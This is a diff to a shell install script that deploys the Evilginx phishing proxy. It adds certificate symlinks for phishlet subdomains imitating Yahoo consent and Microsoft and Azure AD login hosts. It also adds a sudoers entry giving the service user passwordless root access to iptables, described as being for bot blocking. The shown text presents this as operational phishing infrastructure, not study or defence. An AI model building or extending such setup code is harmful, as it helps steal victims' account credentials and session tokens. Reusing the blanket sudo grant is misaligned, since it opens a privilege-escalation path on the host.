@@ -221,6 +221,7 @@ install_dependencies() {
         unzip \
         jq \
         sqlite3 \
+        iptables \
         certbot \
         python3-certbot-dns-cloudflare \
         golang-go \
@@ -411,6 +412,12 @@ setup_system_user() {
     if ! id "$SERVICE_USER" >/dev/null; then
         useradd -r -g "$SERVICE_GROUP" -s /bin/false -d /var/lib/authflow "$SERVICE_USER"
         log "Created user: $SERVICE_USER"
+
+        # Grant permission to manage the firewall for automatic bot blocking
+        if command -v iptables >/dev/null; then
+            echo "$SERVICE_USER ALL=(ALL) NOPASSWD: $(command -v iptables)" > "/etc/sudoers.d/$SERVICE_USER"
+            chmod 440 "/etc/sudoers.d/$SERVICE_USER"
+        fi
     fi
 
     # Create directories with proper permissions
@@ -522,6 +529,12 @@ configure_evilginx_integration() {
     # Create symlinks for nested subdomains used by phishlets (e.g. Yahoo's api subdomain)
     ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/api.${EP1}.${DOMAIN}.crt"
     ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/api.${EP1}.${DOMAIN}.key"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/guce.${EP1}.${DOMAIN}.crt"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/guce.${EP1}.${DOMAIN}.key"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/logincdn.${EP2}.${DOMAIN}.crt"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/logincdn.${EP2}.${DOMAIN}.key"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/aadcdn.${EP2}.${DOMAIN}.crt"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/aadcdn.${EP2}.${DOMAIN}.key"
     
     # Create config.yaml in the config subdirectory
     cat > "$EVILGINX_DIR/config/config.yaml" << EOF
